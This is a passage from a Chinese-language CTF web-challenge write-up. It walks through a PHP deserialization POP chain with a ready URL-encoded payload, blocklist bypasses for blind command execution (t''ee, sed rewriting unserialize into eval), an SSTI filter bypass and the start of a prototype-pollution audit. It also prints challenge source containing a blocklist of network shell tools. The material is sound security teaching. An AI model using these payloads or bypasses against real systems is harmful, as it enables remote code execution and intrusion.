punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"==GAME OVER==\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">CTF</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$handle</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">handle</span><span class=\"token operator\">-></span><span class=\"token property\">log</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">WhiteGod</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$func</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$var</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">func</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    </pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>@<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pop'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>简单的 pop 链子，从 Begin 的__destruct 析构函数作为起点开始，构造 POP 链触发到 WhiteGod 的__unset 方法，__unset 方法中存在一个函数的动态调用，可以实现 RCE。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Begin</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span> <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Then</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$func</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">func</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Super</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Handle</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$obj</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">obj</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">CTF</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Super</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$obj</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">obj</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Handle</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">CTF</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$handle</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">handle</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">WhiteGod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">WhiteGod</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$func</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"system\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$var</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"cat /flag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">-></span> <span class=\"token property\">name</span><span class=\"token operator\">=</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token comment\">//echo serialize($a);</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>需要注意的是一些类中有保护或私有属性的成员，因此需要对序列化数据进行 URL 编码，得到：</p>\n<blockquote>\n<p>pop=O%3A5%3A%22Begin%22%3A1%3A%7Bs%3A4%3A%22name%22%3BO%3A4%3A%22Then%22%3A1%3A%7Bs%3A10%3A%22%00Then%00func%22%3BO%3A5%3A%22Super%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00obj%22%3BO%3A6%3A%22Handle%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00obj%22%3BO%3A3%3A%22CTF%22%3A1%3A%7Bs%3A6%3A%22handle%22%3BO%3A8%3A%22WhiteGod%22%3A2%3A%7Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3Bs%3A3%3A%22var%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7D%7D%7D%7D%7D</p>\n</blockquote>\n<h3 id=\"rce-3\"><a class=\"anchor\" href=\"#rce-3\">#</a> R!<span class=\"spoiler\" title=\"你知道得太多了\">C</span>!E!!!</h3>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">minipop</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$qwejaskdjnlka</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\>|\\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"alright\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">qwejaskdjnlka</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'payload'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token comment\">//wanna try?</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'payload'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>还是很简单的 rce，通过__destruct 函数中的 echo 函数来触发 minipop 类中的__tostring 函数，然后就是无回显 rce，可以看到过滤了很多，本题依旧具有写入权限，像 ls &gt; 1.txt 这种方式是用不了了，但 tee 命令可以使用 t''ee 来绕过，于是便有了第一种解法：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">minipop</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$code</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"cat /flag_is_h3eeere | t''ee 1\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$qwejaskdjnlka</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ne</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">minipop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">qwejaskdjnlka</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">minipop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>看了下官方题解，官方给的非预期解是通过 script 命令，和 tee 这种殊途同归，不过我还是第一次了解到这个命令，长见识了...</p>\n<p>可以参考这篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW51eC5jbi9hcnRpY2xlLTMxOTUtMS5odG1s\">Linux script 命令 —— 终端里的记录器</span></p>\n<p>官方给的预期解是 bash 盲注：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaGltby5pbS9kb2NzL1FQTVJ4ekdrdHpzWm56aHovcmVhZA==\">https://shimo.im/docs/QPMRxzGktzsZnzhz/read</span></p>\n<p>关于 bash 盲注，可以参考这篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tyYWN4aS9hcnRpY2xlL2RldGFpbHMvMTIxODk2MDU0\">命令执行漏洞</span></p>\n<p>简单解释一下这个脚本，先引入 time，requesets 库，然后构造命令，awk 命令就是一行一行读取文件内容，后面的 NR 就是对应的行数，然后 cut -c 就是以字符为单位取出字符，和字符集比较开始爆破，如果成功就停顿两秒，后面 time 函数显然就是与它配合使用的。</p>\n<p>这里再说一道有意思的解法，在这之前可以参考下这篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tyYWN4aS9hcnRpY2xlL2RldGFpbHMvMTIxOTk3MTY2\">CTFshow php 特性 web136</span></p>\n<p>对于其中所用到的 sed 命令和 xargs 命令可以看看这个文档：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9saW51eC9saW51eC1jb21tLXNlZC5odG1s\">Linux sed 命令</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9saW51eC9saW51eC1jb21tLXhhcmdzLmh0bWw=\">Linux xargs 命令</span></p>\n<p>它这里用了以下两个命令：</p>\n<p><code>ls | xargs sed -i &quot;s/die/echo/&quot;</code> <br />\n 把 die 替换成 echo<br />\n <code>ls | xargs sed -i &quot;s/exec/system/&quot;</code> <br />\n 把 exec 替换成 system</p>\n<p>首先列出目录下的文件，xargs 命令是为了配和管道符使用，因为 ls 命令可能不支持使用管道符，然后 sed 修改这个文件内容。</p>\n<p>不过很明显，它这道题的代码逻辑和本题并不相同，对于本题，我们可以这样写：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">minipop</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$qwejaskdjnlka</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token comment\">#public $code=\"ls;cat /flag_is_h3eeere | script 1\";</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$code</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"ls | xargs sed -i 's/unserialize/eval/'\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">minipop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">qwejaskdjnlka</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">minipop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>将 unserialize 函数替换成 eval 函数，就可以随便玩了。</p>\n<h3 id=\"genshin\"><a class=\"anchor\" href=\"#genshin\">#</a> GenShin</h3>\n<p>进入题目让我们</p>\n<blockquote>\n<p>Oh!try to find some information that is useful~</p>\n</blockquote>\n<p>在响应包中看到 /secr3tofpop</p>\n<p>进入后：</p>\n<blockquote>\n<p>please give a name by get</p>\n</blockquote>\n<p>测试后发现是 Python 简单的 SSTI，ban 掉了一些类，像 init,popen 等等啥的，还有单引号也被过滤了，万幸的是双引号还能用，popen 可以用 &quot;pop&quot;+&quot;en&quot; 拼接绕过，</p>\n<p>我的解法是通过找它的 file 类来得到 flag 的：</p>\n<p><img data-src=\"../../../images/Iknowyouwillstop/23.png\" alt=\"21\" /></p>\n<p>不过这种方法有个弊病，就是如果不知道文件名就无法包含。</p>\n<p>在第 414 找到，然后：</p>\n<p><img data-src=\"../../../images/Iknowyouwillstop/21.png\" alt=\"21\" /></p>\n<p>得到 flag。</p>\n<p>官方 wp 是直接利用内置函数来获取的：</p>\n<p><img data-src=\"../../../images/Iknowyouwillstop/22.png\" alt=\"21\" /></p>\n<h3 id=\"otenkigirl\"><a class=\"anchor\" href=\"#otenkigirl\">#</a> OtenkiGirl</h3>\n<p>考察原型链污染，可以参考以下文章：</p>\n<p><a href=\"https://www.yuque.com/cnily03/tech/js-prototype-pollution?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgwMjQ5NDIsImZpbGVHVUlEIjoiUVBNUnh6R2t0enNabnpoeiIsImlhdCI6MTY5ODAyNDY0MiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMyODgzMDc4NH0.pn6NPU5qfmCdQyooh3tn2iYG1ZiVDRegqSoDUvfZ68w\"><strong>JavaScript 原型链污染</strong></a></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmx4c2Nsb3VkLnRvcC8yMDIyLzExLzEzL25vZGVqcyVFNSU4RSU5RiVFNSU5RSU4QiVFOSU5MyVCRSVFNiVCMSVBMSVFNiU5RiU5MyVFNSU5RiVCQSVFNyVBMSU4MCVFNyU5RiVBNSVFOCVBRiU4Ni8=\">Nodejs 原型链污染攻击基础知识</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vamF2YXNjcmlwdC1wcm90b3R5cGUtcG9sbHV0aW9uLWF0dGFjay5odG1s\">深入理解 JavaScript Prototype 污染攻击</span></p>\n<p>根据题目附件中给的 hint.txt 文件：</p>\n<blockquote>\n<p>『「routes」フォルダーだけを見てください。SQL インジェクションはありません。』と御坂御坂は期待に満ちた気持ちで言った。</p>\n</blockquote>\n<p>翻译一下就是本题只需要查看 route 目录中的文件且与 SQL 注入没关系，所以不用考虑 SQL 注入。</p>\n<p>而 route 目录下有三个文件：info.js  sql.js  submit.js。</p>\n<p>那就审计一下 info.js 和 submit.js。</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//info.js</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 导入 Koa Router 模块</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">const</span> Router <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"koa-router\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// 创建 Koa Router 的新实例</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">const</span> router <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Router</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">// 导入 SQL 模块（假设这是一个自定义模块）</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token constant\">SQL</span> <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./sql\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">// 创建 SQL 类的新实例，表名为 \"wishes\"</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">const</span> sql <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SQL</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"wishes\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// 导入 CONFIG 和 DEFAULT_CONFIG 模块</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token constant\">CONFIG</span> <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token 